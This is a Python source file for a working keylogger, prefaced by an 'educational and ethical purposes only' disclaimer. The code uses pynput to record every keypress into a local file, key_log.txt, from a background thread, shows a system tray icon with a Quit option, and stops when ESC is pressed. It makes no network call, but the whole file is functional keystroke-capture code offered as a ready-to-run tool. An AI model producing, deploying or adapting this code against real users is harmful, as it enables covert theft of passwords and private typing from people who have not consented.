"""
DISCLAIMER:
This keylogger is developed strictly for educational and ethical purposes only.
Do NOT use this tool on any system without the owner's consent.
Misuse of this code for unauthorized access or malicious intent is illegal and punishable under law.
"""

import datetime
import threading
from pynput.keyboard import Listener, Key
from pystray import Icon, MenuItem, Menu
from PIL import Image, ImageDraw
import sys

log_file = "key_log.txt"

with open(log_file, "a") as f:
    f.write(f"\n\n--- Keylogger started at {datetime.datetime.now()} ---\n")

def log_key(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            elif key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("    ")
            elif key == Key.backspace:
                pass
            else:
                pass
    except Exception as e:
        print(f"Error logging key: {e}")

    if key == Key.esc:
        print("Stopping keylogger...")
        return False

def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

def create_tray_icon():
    icon_image = Image.new('RGBA', (64, 64), (255, 255, 255, 0))
    draw = ImageDraw.Draw(icon_image)
    draw.rectangle((0, 0, 64, 64), fill="blue")
    
    def on_quit(icon, item):
        icon.stop()
        sys.exit()

    icon = Icon("Keylogger", icon_image, menu=Menu(MenuItem("Quit", on_quit)))
    icon.run()

def main():
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    create_tray_icon()

if __name__ == "__main__":
    print("Starting keylogger in the background... Press ESC to stop.")
    main()
